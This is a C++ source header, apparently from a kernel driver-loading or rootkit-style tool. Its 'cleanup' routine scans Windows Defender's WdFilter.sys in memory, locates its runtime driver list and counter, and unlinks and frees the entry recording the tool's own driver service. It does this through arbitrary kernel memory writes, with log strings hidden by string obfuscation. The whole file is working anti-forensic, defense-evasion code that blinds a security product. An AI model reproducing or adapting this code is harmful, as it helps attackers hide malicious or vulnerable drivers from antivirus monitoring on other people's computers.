#pragma once
#include "scan.hpp"
#include <algorithm>

namespace cleanup {
namespace wdfilter {

inline std::uint32_t image_size( std::uint64_t base ) {
    IMAGE_DOS_HEADER dos{};
    if ( !g_paging->read_virtual_memory( base, &dos, sizeof( dos ) ) || dos.e_magic != IMAGE_DOS_SIGNATURE )
        return 0;
    IMAGE_NT_HEADERS64 nt{};
    if ( !g_paging->read_virtual_memory( base + dos.e_lfanew, &nt, sizeof( nt ) ) ||
         nt.Signature != IMAGE_NT_SIGNATURE )
        return 0;
    return nt.OptionalHeader.SizeOfImage;
}

inline bool clear( const context_t& ctx ) {
    if ( !g_paging || !g_syscall )
        return true;

    if ( !ctx.service_name[ 0 ] || wcslen( ctx.service_name ) < 6 ) {
        logging::print( oxorany( "cleanup/wd: service name too short - skip (false-match guard)" ) );
        return true;
    }

    auto mod = module::get_kernel_module( oxorany( "WdFilter.sys" ) );
    if ( !mod || !mod->m_module_base || !kernel_va_plausible( mod->m_module_base ) ) {
        logging::print( oxorany( "cleanup/wd: WdFilter not loaded - skip" ) );
        return true;
    }

    const auto wd_base = mod->m_module_base;
    const auto wd_size = image_size( wd_base );
    if ( !wd_size || wd_size > 0x2000000 ) {
        logging::print( oxorany( "cleanup/wd: bad SizeOfImage - skip" ) );
        return true;
    }

    std::uint64_t page_va = 0;
    std::uint32_t page_size = 0;
    if ( !pattern::find_section( wd_base, oxorany( "PAGE" ), &page_va, &page_size ) ) {
        logging::print( oxorany( "cleanup/wd: PAGE section miss - skip" ) );
        return true;
    }

    const std::uint8_t list_pat[ ] = {
        0x48, 0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x05
    };
    auto list_sig = pattern::find_pattern( page_va, page_size, list_pat, "xxx????xx" );
    if ( !list_sig ) {
        logging::print( oxorany( "cleanup/wd: RuntimeDriversList pattern miss - skip" ) );
        return true;
    }

    auto runtime_list = pattern::resolve_relative( list_sig, 3, 7 );
    if ( !runtime_list || !kernel_va_plausible( runtime_list ) ||
         runtime_list < wd_base || runtime_list >= wd_base + wd_size ) {
        logging::print( oxorany( "cleanup/wd: list resolve outside WdFilter - skip" ) );
        return true;
    }
    const auto list_head = runtime_list - 0x8;
    if ( list_head < wd_base || list_head >= wd_base + wd_size ) {
        logging::print( oxorany( "cleanup/wd: list head outside WdFilter - skip" ) );
        return true;
    }

    const std::uint8_t count_pat[ ] = {
        0xFF, 0x05, 0x00, 0x00, 0x00, 0x00, 0x48, 0x39, 0x11
    };
    auto count_sig = pattern::find_pattern( page_va, page_size, count_pat, "xx????xxx" );
    if ( !count_sig ) {
        logging::print( oxorany( "cleanup/wd: RuntimeDriversCount pattern miss - skip" ) );
        return true;
    }
    const auto count_va = pattern::resolve_relative( count_sig, 2, 6 );
    if ( !count_va || !kernel_va_plausible( count_va ) ||
         count_va < wd_base || count_va >= wd_base + wd_size ) {
        logging::print( oxorany( "cleanup/wd: count resolve outside WdFilter - skip" ) );
        return true;
    }

    std::uint64_t array_va = 0;
    if ( !g_paging->read_virtual_memory( count_va + 8, &array_va, sizeof( array_va ) ) ||
         !kernel_va_plausible( array_va ) ) {
        logging::print( oxorany( "cleanup/wd: array ptr bad - skip" ) );
        return true;
    }

    std::uint64_t free_fn = 0;
    {
        const std::uint8_t p1[ ] = {
            0x89, 0x00, 0x08, 0xE8, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE9
        };
        auto s = pattern::find_pattern( page_va, page_size, p1, "x?xx???????????x" );
        if ( s ) {
            free_fn = pattern::resolve_relative( s + 3, 1, 5 );
        }
        if ( !free_fn || free_fn < wd_base || free_fn >= wd_base + wd_size )
            free_fn = 0;
    }

    LIST_ENTRY head{};
    if ( !g_paging->read_virtual_memory( list_head, &head, sizeof( head ) ) ) {
        logging::print( oxorany( "cleanup/wd: cannot read list head - skip" ) );
        return true;
    }

    auto flink = reinterpret_cast<std::uint64_t>( head.Flink );
    const auto start = list_head;
    int guard = 0;
    const wchar_t* want = ctx.service_name;

    while ( flink && flink != start && guard++ < 256 ) {
        if ( !kernel_va_plausible( flink ) )
            break;

        UNICODE_STRING us{};
        if ( !g_paging->read_virtual_memory( flink + 0x10, &us, sizeof( us ) ) )
            break;

        const auto nlen = us.Length;
        const auto nbuf = reinterpret_cast<std::uint64_t>( us.Buffer );
        if ( !( nlen && nlen < 1024 && !( nlen & 1 ) && nbuf && kernel_va_plausible( nbuf ) ) ) {
            LIST_ENTRY cur{};
            if ( !g_paging->read_virtual_memory( flink, &cur, sizeof( cur ) ) )
                break;
            flink = reinterpret_cast<std::uint64_t>( cur.Flink );
            continue;
        }

        wchar_t nm[ 520 ]{};
        const auto chars = ( std::min )( static_cast<std::size_t>( nlen / 2 ), std::size_t{ 510 } );
        if ( !g_paging->read_virtual_memory( nbuf, nm, chars * sizeof( wchar_t ) ) ) {
            LIST_ENTRY cur{};
            if ( !g_paging->read_virtual_memory( flink, &cur, sizeof( cur ) ) )
                break;
            flink = reinterpret_cast<std::uint64_t>( cur.Flink );
            continue;
        }
        nm[ chars ] = 0;

        {
            bool match = false;
            if ( !_wcsicmp( nm, want ) )
                match = true;
            else {
                wchar_t want_log[ 80 ]{};
                _snwprintf_s( want_log, _TRUNCATE, L"%s.log", want );
                if ( !_wcsicmp( nm, want_log ) )
                    match = true;
                else {
                    const auto hl = wcslen( nm );
                    const auto nl = wcslen( want_log );
                    if ( nl && hl >= nl && !_wcsicmp( nm + ( hl - nl ), want_log ) ) {
                        if ( hl == nl || nm[ hl - nl - 1 ] == L'\\' || nm[ hl - nl - 1 ] == L'/' )
                            match = true;
                    }
                    const auto nw = wcslen( want );
                    if ( !match && nw && hl >= nw && !_wcsicmp( nm + ( hl - nw ), want ) ) {
                        if ( hl == nw || nm[ hl - nw - 1 ] == L'\\' || nm[ hl - nw - 1 ] == L'/' )
                            match = true;
                    }
                }
            }
            if ( !match ) {
                LIST_ENTRY cur{};
                if ( !g_paging->read_virtual_memory( flink, &cur, sizeof( cur ) ) )
                    break;
                flink = reinterpret_cast<std::uint64_t>( cur.Flink );
                continue;
            }
        }

        LIST_ENTRY le{};
        if ( !g_paging->read_virtual_memory( flink, &le, sizeof( le ) ) ||
             !le.Flink || !le.Blink ||
             !kernel_va_plausible( reinterpret_cast<std::uint64_t>( le.Flink ) ) ||
             !kernel_va_plausible( reinterpret_cast<std::uint64_t>( le.Blink ) ) ) {
            logging::print( oxorany( "cleanup/wd: bad list links - abort (no mutate)" ) );
            return true;
        }

        bool list_ok = false;
        {
            const auto flink_p = reinterpret_cast<std::uint64_t>( le.Flink );
            const auto blink_p = reinterpret_cast<std::uint64_t>( le.Blink );
            if ( g_paging->write_virtual_memory( blink_p, &le.Flink, sizeof( void* ) ) ) {
                if ( g_paging->write_virtual_memory( flink_p + sizeof( void* ), &le.Blink, sizeof( void* ) ) ) {
                    list_ok = true;
                } else {
                    const auto self = reinterpret_cast<void*>( flink );
                    g_paging->write_virtual_memory( blink_p, &self, sizeof( void* ) );
                    logging::print( oxorany( "cleanup/wd: half-unlink reversed - skip array/count/free" ) );
                }
            } else {
                logging::print( oxorany( "cleanup/wd: unlink write1 failed - no mutate" ) );
            }
        }
        if ( !list_ok )
            return true;

        const auto same_index_list = flink - 0x10;
        for ( int k = 0; k < 256; ++k ) {
            std::uint64_t slot = 0;
            if ( !g_paging->read_virtual_memory( array_va + static_cast<std::uint64_t>( k ) * 8,
                &slot, sizeof( slot ) ) )
                break;
            if ( slot == same_index_list ) {
                const std::uint64_t empty_val = count_va + 1;
                g_paging->write_virtual_memory( array_va + static_cast<std::uint64_t>( k ) * 8,
                    &empty_val, sizeof( empty_val ) );
                break;
            }
        }

        std::uint32_t count = 0;
        if ( g_paging->read_virtual_memory( count_va, &count, sizeof( count ) ) &&
             count > 0 && count < 0x10000 ) {
            count--;
            g_paging->write_virtual_memory( count_va, &count, sizeof( count ) );
        }

        const auto driver_info = flink - 0x20;
        std::uint16_t magic = 0;
        if ( free_fn &&
             g_paging->read_virtual_memory( driver_info, &magic, sizeof( magic ) ) &&
             magic == 0xDA18 ) {
            g_syscall->call_kernel< void >( free_fn, reinterpret_cast<void*>( driver_info ) );
            logging::print( oxorany( "cleanup/wd: unlinked+freed %ls (magic OK)" ), nm );
        } else {
            logging::print( oxorany( "cleanup/wd: unlinked %ls (no free - BSOD-safe residual free skip)" ), nm );
        }

        return true;
    }

    logging::print( oxorany( "cleanup/wd: no matching entry for our service (ok)" ) );
    return true;
}

}
}
